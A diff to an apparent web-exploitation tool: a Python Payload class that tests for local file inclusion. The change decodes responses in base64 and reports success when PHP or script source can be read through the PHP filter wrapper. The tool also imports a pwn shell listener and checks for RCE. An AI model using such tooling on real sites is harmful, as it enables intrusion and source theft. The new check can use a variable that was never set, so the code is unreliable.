@@ -12,7 +12,8 @@ from pwn import listen
 import threading
 import time
 import pathlib
-import os 
+import os
+import base64
 
 class Payload:
 
@@ -248,18 +249,26 @@ class Payload:
 			clean = self.hit(compUrl)
 			words = clean.split()
 			if len(words) > 0:
+				w = ["\\n", "\n", "\n\n"]
 				for word in words:
-					if word.endswith('='):
+					for c in w:
+						if word.__contains__(c):
+							wordd = word.strip("b'").replace(c, "")
+							wo = wordd.replace("\\t", "")
+							try:
+								base = base64.b64decode(wo).decode()
+							except Exception as e:
+								continue
+					if base.__contains__('<?php') or base.__contains__('<script'):
 						print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
 						if self.outfile is not None:
 							self.outfile.write('[+] Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
 					else:
 						if self.verbosity > 0:
 							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-			else:
+			else:	
 				if self.verbosity > 0:
 					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-
 
 
 
@@ -292,6 +301,7 @@ class Payload:
 		if len(rce) == 0:
 			return False
 		return rce
+
 
 
 
